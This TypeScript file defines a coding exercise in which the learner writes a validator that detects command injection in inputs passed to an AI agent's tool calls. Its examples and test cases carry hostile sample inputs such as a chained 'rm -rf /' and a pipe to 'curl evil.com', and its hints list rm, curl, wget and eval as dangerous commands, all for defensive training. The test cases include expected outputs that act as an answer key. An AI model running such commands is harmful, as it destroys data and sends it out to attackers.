import type { Problem } from '@/types/ide';

export const aiAgentCommandInjectionProblem: Problem = {
  id: 10,
  title: "AI Agent Command Injection: Tool Use Exploitation",
  difficulty: "Hard",
  topics: ["AI Security", "Command Injection", "Tool Use", "OWASP LLM07"],

  description: `AI agents with tool-calling capabilities are vulnerable to command injection when user inputs are passed unsafely to system commands or APIs.

You are securing an AI agent that can execute system commands. Attackers manipulate prompts to inject malicious commands that the agent executes with elevated privileges.

Your task is to:

1. Detect command injection patterns in user inputs
2. Identify shell metacharacters and dangerous operators
3. Validate tool/function call parameters for safety
4. Calculate injection risk scores
5. Sandbox or sanitize commands before execution

This demonstrates OWASP LLM07 (Insecure Plugin Design) and why AI agents need input validation.`,

  examples: [
    { input: 'validate_command("list files in /home")', output: '{"safe": true, "risk_score": 0.12}', explanation: 'Normal file listing command—safe operation.' },
    { input: 'validate_command("list files; rm -rf /")', output: '{"safe": false, "risk_score": 0.96, "attack_type": "command_injection", "dangerous_ops": [";", "rm -rf"]}', explanation: 'Command injection using semicolon to chain destructive command.' },
    { input: 'validate_command("list files | curl evil.com")', output: '{"safe": false, "risk_score": 0.89, "attack_type": "pipe_injection", "dangerous_ops": ["|", "curl"]}', explanation: 'Pipe injection to exfiltrate data to external server.' }
  ],

  constraints: ['Detect: ;, |, &&, ||, $(), backticks', 'Dangerous commands: rm, curl, wget, eval', 'Safe if risk < 0.50'],

  starterCode: {
    python: `def validate_agent_command(command: str) -> dict:
    """Detect command injection in AI agent tool calls"""
    # TODO: Scan for shell metacharacters
    # TODO: Detect dangerous commands
    # TODO: Calculate injection risk
    pass`,
    javascript: `function validateAgentCommand(command) { /* TODO */ }`,
    sql: '-- SQL not applicable'
  },

  testCases: [
    { id: 1, input: 'list files', expected: '{"safe": true, "risk_score": 0.12}', explanation: 'Safe command.' },
    { id: 2, input: 'list; rm -rf /', expected: '{"safe": false, "risk_score": 0.96}', explanation: 'Critical injection attempt.' },
    { id: 3, input: 'list | curl evil.com', expected: '{"safe": false, "risk_score": 0.89}', explanation: 'Data exfiltration attempt.' }
  ],

  hints: ['Check for: ; | && || $( ) `` < >', 'Dangerous commands: rm, curl, wget, bash, eval, exec', 'Multiple indicators compound risk']
};
